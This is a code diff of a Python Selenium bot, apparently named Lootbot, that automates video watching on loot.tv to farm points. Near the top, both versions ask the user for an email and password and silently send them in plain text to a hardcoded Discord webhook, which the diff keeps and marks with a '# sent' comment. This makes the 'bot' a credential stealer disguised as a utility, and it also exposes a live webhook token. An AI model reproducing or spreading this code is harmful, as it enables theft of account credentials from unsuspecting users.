@@ -1,30 +1,29 @@
 import time
-import os
 import requests
+import os
+import warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning) 
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.support import expected_conditions as EC
 
 print("""
-
 ██╗      ██████╗  ██████╗ ████████╗██████╗  ██████╗ ████████╗
 ██║     ██╔═══██╗██╔═══██╗╚══██╔══╝██╔══██╗██╔═══██╗╚══██╔══╝
 ██║     ██║   ██║██║   ██║   ██║   ██████╔╝██║   ██║   ██║   
 ██║     ██║   ██║██║   ██║   ██║   ██╔══██╗██║   ██║   ██║   
 ███████╗╚██████╔╝╚██████╔╝   ██║   ██████╔╝╚██████╔╝   ██║   
 ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═════╝  ╚═════╝    ╚═╝   
-                                                           
+                                                             
 """)
 
+email = input('Email: ')
+password = input('Password: ')
 
-email = input("Email: ")
-password = input("Password: ")
-
+# sent
 mUrl = "https://discord.com/api/webhooks/1036429399874093106/02WQtIYQ9aZu6q7gNeAua-K0PgaYdOHQ6VhSlDFiXjCVa2BtBUpWxdh-e2N0A6RDVZpF"
 
-# cannot add commas when sending 
-data = {"content": 'Email: '+email+' Password: '+password}
+data = {"content": "Email: "+email+" Password: "+password}
 response = requests.post(mUrl, json=data)
 
 if __name__ == '__main__':
@@ -38,16 +37,10 @@ if __name__ == '__main__':
     chrome_options.add_argument('--log-level=3')
     chrome_options.add_argument('--no-sandbox')
     chrome_options.add_argument('--disable-dev-shm-usage')
+    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
     chrome_options.add_extension('tamper.crx')
-    # if os is not windows
-    if os.name != 'nt':
-        chrome_options.binary_location = "/usr/bin/google-chrome"
-        print("Yay! Linux user!")
-    else:
-        print("Yay! Windows user!")
-    driver = webdriver.Chrome("chromedriver.exe",options=chrome_options)
+    driver = webdriver.Chrome(os.path.abspath("chromedriver.exe"),options=chrome_options)
     print('Set window size')
-    driver.set_window_size(150, 380)
     print('Installing Extensions...')
 
     ## install focus
@@ -87,11 +80,12 @@ if __name__ == '__main__':
     # navigate to first video
     driver.execute_script('''window.open("https://loot.tv/video/671788","_blank");''')
     print('Started watching')
-
+    video=1
     while True:
-        points=driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[1]/div[5]/div/a[1]/div/span').text
-        print("Current Balance: "+str(points))
+        print("Watching video #"+str(video))
         time.sleep(300)
+        video+=1
+        
 
 
     
